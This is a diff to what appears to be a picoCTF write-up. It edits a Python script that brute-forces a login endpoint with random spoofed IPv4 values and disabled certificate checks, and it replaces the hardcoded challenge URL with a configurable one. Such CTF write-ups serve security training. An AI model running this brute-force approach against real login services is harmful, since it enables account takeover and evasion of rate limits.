@@ -25,6 +25,7 @@ here a code in python that will help in this
 ```
 import requests
 import random
+url = "" # Enter your instance url
 def random_ipv4():
     return "{}.{}.{}.{}".format( random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254),)
 def Login(PassW , Ip):
@@ -40,7 +41,7 @@ def Login(PassW , Ip):
 
     json_data = { 'email': 'ctf-player@picoctf.org', 'password': PassW,}
 
-    response = requests.post('http://amiable-citadel.picoctf.net:55983/login', headers=headers, json=json_data, verify=False)
+    response = requests.post(url, headers=headers, json=json_data, verify=False)
     if 'success' in response.text:
         success = response.json().get('success')
         if success:
